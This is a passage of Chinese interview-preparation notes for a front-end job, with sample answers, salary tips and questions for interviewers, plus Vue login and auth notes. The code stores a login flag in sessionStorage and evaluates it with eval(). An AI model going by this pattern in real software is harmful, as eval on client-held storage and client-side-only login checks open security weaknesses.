同时，在5年之内，我要持续的学习js/html/css知识，掌握独立解决问题的能力，争取做到资深前端开发工程师职位，
独立负责一个项目前端的事务，解决前端交互遇到的各种问题。巩固基本知识的同时关注前端前沿技术。
另外，我也会根据自身的发展情况不断调整计划，使其更合理，更容易达成。对于职业规划，大致是这样子的，谢谢！
```
### 你为什么来应聘这个岗位
```
首先，我个人对这个岗位非常感兴趣，它能够让我将工作与兴趣结合起来。
其次，我曾经通过xxx，做了xxx，取得了xxx效果，具备xxx能力，这恰巧也是这个岗位所需要的，所以，我来了
```
### 说一说你在工作中遇到的问题以及你是怎么解决的
* 叙述模式：做了什么+怎么做的+最后的结果+总结
* Tips：重点描述解决问题的过程，别忘了总结经验
```
我在xxx工作时，接到了xxx项目。因为和竞品外观相似度较高，需要规避专利风险，对xxx重新设计。（做了什么）
由于焊点不能暴露在外面，又要保证美观，因此我连着加班3天，做了十几个备选方案，筛选出一套全新的一体化和内折叠的结构设计方案（怎么做的）
不仅外观更好看，产品上市后，消费者反馈良好。（最后的结果），
在这次工作中，我意识到，遇到问题，我们不能钻牛角尖，需要及时变换方式方法，灵活应对。（总结经验

背景描述：
每一次点击登录按钮时，我在mutation提交对state的管理
将 {admin:管理员信息} {‘islogin’:'true'}存到sessionStroage
同时同步信息到state
```
* 怎么鉴权
```
我原来的想法是，由于登录进系统以后，我每次看到的页面都要经过一个父组件渲染，home.vue
所以我在mounted里面加一个判断如果sessionStroage有login true则不拦截，否则跳回到登录界面

网上是这样说的，你这个就是要判断进来这个页面要不要登录，你可以先在/home配置路劲下加一个
meta:{requiresAuth: true}
然后在main.js文件加一个全局前置路由钩子beforeEach(to,from,next)
你每一切换路由的时候，就检查to.matched里面有没有一个路由的meta.requiresAuth为true,只要有一个为true,
就证明这是一个需要登录之后才能看到的界面，然后只需检查一下登录状态就可以了，接着根据不同的情况执行next()函数
```
* 怎么维持登录状态
```
登录进来之后，每一次刷新界面，store里面的state会重置为null,无法从store里面获取值
想到了如果你现在是处于登陆状态，则sessionStorage一定是有值得，所以state初始化的时候从sessionstroage里取值
const state={
  isLogin: eval(window.sessionStorage.getItem('isLogin')) || false,  进行或判断即可
  administrator: JSON.parse(window.sessionStorage.getItem('admin')) || {}
}
```
* 对表格数据进行新增、删除、上移、下移操作
```
首先要知道渲染表格其实就是一个数组，其次点击事件是可以传入表格所在行信息的参数
删除：删除对应数组所在行的数据
新增： 在对应行所在的数组加一个元素
上移下移：那我交换一下元素是不是就可以呢，答案是不可以的，我又想了一下，既然你能新增，删除为什么就是不能上移下移呢？
然后我换了一个思路，假设你现在要上移你这一行的数据，首先我把这一行的数据拷贝一下，然后从数组中删除对应的元素，然后
再在前面插入我之前拷贝的元素，发现可以上移了
```
### 本科成绩差
```
一直学习都挺认真的，之前方法不对，一直没学好，后来找到问题，成绩就慢慢赶上来了
```
### 薪资
```
首先上boss直聘、智联招聘、拉勾网这些渠道上了解目标岗位的薪资预算范围。
如果你感觉聊得不错，预算工资可以比较接近预算上限（10000），聊得一般的话，取个中间数就可以。（7500）
```
### 你还有什么想要问我的么
* 入职后有没有培训活动
* 公司对我的期望是什么
* 我进去的这个部门是什么,团队有多少人?主要是负责哪方面的?移动端/网页端
* 可以加一下您的微信么
```
提问岗位情况:
关于这个岗位，您觉得最重要的工作内容是什么？
关于这个职位，您觉得有什么需要特别注意的？

提问岗位真实性:
这个岗位是新开设的还是原岗位上的人离职了？
这个岗位汇报给哪个部门的领导？
这个岗位对可以为公司业务带来什么价值？

提问职业发展:
以您来看，这个岗位未来在公司内部的发展如何？
我想了解一下公司的培训机制和学习机制

提行业和企业战略的问题:
您对这个行业未来的发展怎么看？
您对企业未来的战略有什么想法？

提问关于工作和岗位的问题:
您认为做这份工作需要具备哪些核心素质？
您认为你希望你的下属具备什么样的特质？
您认为考核这个岗位员工的最重要指标有哪些？

趁热打铁:
您面试到现在，看了这么多候选人，您觉得我相对于这个岗位，还有哪些差距需要改善？
以您丰富的职场经验，您觉得我自己还有什么可以提升的地方？
```
